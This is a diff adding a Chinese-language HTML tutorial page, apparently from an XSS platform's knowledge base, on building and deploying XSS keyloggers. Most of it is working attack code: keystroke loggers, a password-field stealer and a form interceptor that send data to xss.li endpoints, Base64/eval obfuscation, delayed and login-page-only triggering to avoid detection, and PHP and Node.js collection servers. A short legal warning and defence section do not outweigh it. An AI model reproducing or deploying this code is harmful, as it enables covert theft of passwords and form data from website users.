@@ -1,0 +1,313 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0">
+    
+    <!-- Favicon -->
+    <link rel="icon" type="image/png" href="../tu/xssicon.png">
+    <link rel="shortcut icon" type="image/png" href="../tu/xssicon.png">
+    <link rel="apple-touch-icon" href="../tu/xssicon.png">
+    
+<meta name="description" content="XSS键盘记录器完整开发教程，包括JavaScript实现、数据传输、隐蔽性优化、防检测技巧及实战部署方法。">
+<meta name="keywords" content="XSS键盘记录,Keylogger,JavaScript键盘监听,XSS攻击,数据窃取,Web安全">
+<title>XSS键盘记录器开发与应用 - XSS安全知识库</title>
+<link href="../static/libs/bootstrap/css/bootstrap.min.css" rel="stylesheet"><link href="../static/libs/fontawesome/css/all.min.css" rel="stylesheet"><link href="../static/css/style.css" rel="stylesheet"><link href="../static/libs/prism/css/prism-tomorrow.min.css" rel="stylesheet">
+<style>.header{background:linear-gradient(135deg,#1a1a2e,#16213e);padding:3rem 0;border-bottom:2px solid #00ff41}.content{max-width:900px;margin:2rem auto;padding:2rem;background:rgba(0,0,0,0.3);border-radius:8px}h2{color:#00ff41;margin-top:2.5rem;padding-bottom:0.5rem;border-bottom:2px solid rgba(0,255,65,0.3)}pre{background:rgba(0,0,0,0.5);padding:1.5rem;border-radius:8px;border-left:3px solid #00ff41}.warn{background:rgba(220,53,69,0.1);border-left:4px solid #dc3545;padding:1rem;margin:1.5rem 0}        
+        /* 鍥炲埌椤堕儴鎸夐挳 */
+        .back-to-top {
+            position: fixed;
+            bottom: 40px;
+            right: 40px;
+            width: 50px;
+            height: 50px;
+            background: var(--neon-green);
+            color: #000;
+            border: none;
+            border-radius: 50%;
+            font-size: 1.5rem;
+            cursor: pointer;
+            opacity: 0;
+            visibility: hidden;
+            transition: all 0.3s ease;
+            z-index: 1000;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            box-shadow: 0 4px 15px rgba(0, 255, 65, 0.3);
+        }
+        
+        .back-to-top:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 6px 20px rgba(0, 255, 65, 0.5);
+        }
+        
+        .back-to-top.show {
+            opacity: 1;
+            visibility: visible;
+        }
+    </style>
+</head>
+<body>
+<div class="container"><nav aria-label="breadcrumb"><ol class="breadcrumb" style="background:transparent;padding:1rem 0"><li class="breadcrumb-item"><a href="../index.html" style="color:#00ff41">首页</a></li><li class="breadcrumb-item"><a href="../wiki.html" style="color:#00ff41">知识库</a></li><li class="breadcrumb-item active">键盘记录器</li></ol></nav></div>
+<div class="header"><div class="container text-center"><h1 style="font-size:2.5rem;color:#fff"><i class="fas fa-keyboard"></i> XSS键盘记录器开发与应用</h1><div style="color:#999">20分钟阅读 | 攻击技术</div></div></div>
+<div class="container"><div class="content" style="color:#ccc;line-height:1.8">
+<div class="warn"><h4><i class="fas fa-exclamation-triangle"></i> 法律警告</h4>
+<p>未经授权部署键盘记录器是严重违法行为！本文内容仅用于安全研究和授权的渗透测试。</p></div>
+
+<h2><i class="fas fa-info-circle"></i> 一、键盘记录器原理</h2>
+<p>XSS键盘记录器通过JavaScript监听键盘事件，记录用户输入并发送到攻击者服务器。</p>
+
+<h3>1.1 工作流程</h3>
+<ul><li>注入XSS代码到目标页面</li><li>监听keydown/keypress/keyup事件</li><li>记录按键数据</li><li>定期或实时发送到远程服务器</li><li>服务器存储和展示数据</li></ul>
+
+<h2><i class="fas fa-code"></i> 二、基础实现</h2>
+<h3>2.1 简单版本</h3>
+<pre><code class="language-javascript">// 最简单的键盘记录器
+var keys = '';
+
+document.addEventListener('keypress', function(e) {
+    keys += e.key;
+    
+    // 每20个字符发送一次
+    if (keys.length >= 20) {
+        new Image().src = 'https://xss.li/log?k=' + encodeURIComponent(keys);
+        keys = '';
+    }
+});</code></pre>
+
+<h3>2.2 增强版本</h3>
+<pre><code class="language-javascript">// 完整的键盘记录器
+(function() {
+    var log = '';
+    var sessionId = Math.random().toString(36).substr(2, 9);
+    var lastSend = Date.now();
+    
+    // 监听所有键盘事件
+    document.addEventListener('keydown', function(e) {
+        var key = e.key;
+        
+        // 处理特殊按键
+        if (key === 'Enter') key = '[ENTER]';
+        else if (key === 'Backspace') key = '[BACKSPACE]';
+        else if (key === 'Tab') key = '[TAB]';
+        else if (key === 'Shift') key = '[SHIFT]';
+        else if (key === 'Control') key = '[CTRL]';
+        else if (key === 'Alt') key = '[ALT]';
+        else if (key.length > 1) return; // 忽略其他功能键
+        
+        log += key;
+        
+        // 定时发送（每5秒或50个字符）
+        if (log.length >= 50 || Date.now() - lastSend > 5000) {
+            sendLog();
+        }
+    });
+    
+    // 页面卸载时发送剩余数据
+    window.addEventListener('beforeunload', function() {
+        if (log.length > 0) sendLog();
+    });
+    
+    function sendLog() {
+        if (log.length === 0) return;
+        
+        fetch('https://xss.li/api/keylog', {
+            method: 'POST',
+            mode: 'no-cors',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({
+                session: sessionId,
+                url: location.href,
+                keys: log,
+                timestamp: new Date().toISOString()
+            })
+        });
+        
+        log = '';
+        lastSend = Date.now();
+    }
+})();</code></pre>
+
+<h2><i class="fas fa-lock"></i> 三、密码字段专项监听</h2>
+<h3>3.1 监听密码输入框</h3>
+<pre><code class="language-javascript">// 专门监听密码框
+document.querySelectorAll('input[type="password"]').forEach(function(input) {
+    input.addEventListener('keyup', function() {
+        var data = {
+            field: input.name || input.id,
+            value: input.value,
+            url: location.href
+        };
+        
+        fetch('https://xss.li/api/password', {
+            method: 'POST',
+            mode: 'no-cors',
+            body: JSON.stringify(data)
+        });
+    });
+});</code></pre>
+
+<h3>3.2 表单提交拦截</h3>
+<pre><code class="language-javascript">// 拦截表单提交
+document.querySelectorAll('form').forEach(function(form) {
+    form.addEventListener('submit', function(e) {
+        var formData = {};
+        
+        form.querySelectorAll('input').forEach(function(input) {
+            formData[input.name] = input.value;
+        });
+        
+        // 发送表单数据
+        fetch('https://xss.li/api/formdata', {
+            method: 'POST',
+            mode: 'no-cors',
+            body: JSON.stringify({
+                url: location.href,
+                formData: formData,
+                timestamp: Date.now()
+            })
+        });
+    });
+});</code></pre>
+
+<h2><i class="fas fa-eye-slash"></i> 四、隐蔽性优化</h2>
+<h3>4.1 混淆代码</h3>
+<pre><code class="language-javascript">// 使用eval和Base64混淆
+eval(atob('ZG9jdW1lbnQuYWRkRXZlbnRMaXN0ZW5lcigna2V5cHJlc3MnLGZ1bmN0aW9uKGUpe25ldyBJbWFnZSgpLnNyYz0naHR0cHM6Ly94c3MubGkvbG9nP2s9JytlLmtleX0p'));
+
+// 字符串拆分
+var url = ['ht', 'tps:', '//xs', 's.li', '/log'].join('');
+
+// 动态构建
+var s = String.fromCharCode(100,111,99,117,109,101,110,116); // "document"</code></pre>
+
+<h3>4.2 延迟加载</h3>
+<pre><code class="language-javascript">// 延迟30秒后才开始记录
+setTimeout(function() {
+    // 键盘记录代码
+}, 30000);
+
+// 或在用户交互后激活
+var activated = false;
+document.addEventListener('click', function() {
+    if (!activated) {
+        activated = true;
+        // 启动键盘记录
+    }
+}, {once: true});</code></pre>
+
+<h3>4.3 条件触发</h3>
+<pre><code class="language-javascript">// 只在特定页面触发
+if (location.pathname.includes('/login') || location.pathname.includes('/admin')) {
+    // 启动键盘记录
+}
+
+// 只记录密码相关输入
+if (document.querySelector('input[type="password"]')) {
+    // 启动键盘记录
+}</code></pre>
+
+<h2><i class="fas fa-server"></i> 五、服务端实现</h2>
+<h3>5.1 PHP接收端</h3>
+<pre><code class="language-php">&lt;?php
+// keylog-receiver.php
+header('Access-Control-Allow-Origin: *');
+header('Content-Type: application/json');
+
+$data = json_decode(file_get_contents('php://input'), true);
+
+if ($data && isset($data['keys'])) {
+    $logFile = 'keylogs/' . $data['session'] . '.log';
+    
+    $entry = sprintf(
+        "[%s] %s\nURL: %s\nKeys: %s\n\n",
+        date('Y-m-d H:i:s'),
+        $_SERVER['REMOTE_ADDR'],
+        $data['url'],
+        $data['keys']
+    );
+    
+    file_put_contents($logFile, $entry, FILE_APPEND);
+    
+    // 发送邮件通知
+    if (strlen($data['keys']) > 100) {
+        mail('admin@example.com', 'Keylog Alert', $entry);
+    }
+}
+
+echo json_encode(['status' => 'ok']);
+?&gt;</code></pre>
+
+<h3>5.2 Node.js接收端</h3>
+<pre><code class="language-javascript">// keylog-server.js
+const express = require('express');
+const fs = require('fs');
+const app = express();
+
+app.use(express.json());
+
+app.post('/api/keylog', (req, res) => {
+    const { session, url, keys, timestamp } = req.body;
+    
+    const logEntry = `[${timestamp}] ${req.ip}
+URL: ${url}
+Keys: ${keys}
+
+`;
+    const logFile = `logs/${session}.log`;
+    
+    fs.appendFile(logFile, logEntry, err => {
+        if (err) console.error(err);
+    });
+    
+    res.json({ status: 'ok' });
+});
+
+app.listen(3000);</code></pre>
+
+<h2><i class="fas fa-shield-alt"></i> 六、防御措施</h2>
+<h3>6.1 防止XSS注入</h3>
+<ul><li>严格的输入验证和输出编码</li><li>实施CSP策略</li><li>使用HttpOnly Cookie</li></ul>
+
+<h3>6.2 检测键盘记录器</h3>
+<pre><code class="language-javascript">// 检测可疑的事件监听器
+var listeners = getEventListeners(document);
+if (listeners.keydown || listeners.keypress || listeners.keyup) {
+    console.warn('检测到键盘事件监听器！');
+}</code></pre>
+
+<h3>6.3 用户端防护</h3>
+<ul><li>使用虚拟键盘输入敏感信息</li><li>启用浏览器的安全扩展</li><li>定期检查浏览器扩展权限</li><li>使用NoScript等扩展阻止未知脚本</li></ul>
+
+<h2><i class="fas fa-graduation-cap"></i> 总结</h2>
+<p>键盘记录器是XSS攻击中高危害的利用方式，关键点：</p>
+<ol><li>监听键盘事件获取输入</li><li>优化隐蔽性避免检测</li><li>可靠的数据传输机制</li><li>服务端数据收集和分析</li><li>必须在授权环境下使用</li></ol>
+
+<div style="display:flex;justify-content:space-between;margin-top:3rem;padding-top:2rem;border-top:1px solid #333">
+<a href="burpsuite-xss.html" style="color:#00ff41;text-decoration:none"><i class="fas fa-arrow-left"></i> 上一篇</a>
+<a href="../wiki.html" style="color:#00ff41;text-decoration:none">返回知识库</a>
+<a href="self-xss.html" style="color:#00ff41;text-decoration:none">下一篇 <i class="fas fa-arrow-right"></i></a>
+</div>
+</div></div>
+<footer class="footer"><div class="container-fluid"><div style="text-align:center;color:#999">© 2025 蓝莲花XSS平台</div></div></footer>    
+    <!-- 鍥炲埌椤堕儴鎸夐挳 -->
+    <button class="back-to-top" id="backToTop">
+        <i class="fas fa-arrow-up"></i>
+    </button>
+    
+<script src="../static/libs/bootstrap/js/bootstrap.bundle.min.js"></script>
+<script src="../static/libs/prism/js/prism.min.js"></script>    <script>
+        // 鍥炲埌椤堕儴鍔熻兘
+        const backToTopBtn = document.getElementById('backToTop');
+        window.addEventListener('scroll', function() {
+            if (window.pageYOffset > 300) {
+                backToTopBtn.classList.add('show');
+            } else {
+                backToTopBtn.classList.remove('show');
+            }
+        });
+        backToTopBtn.addEventListener('click', function() {
+            window.scrollTo({ top: 0, behavior: 'smooth' });
+        });
+    </script>
+</body></html>
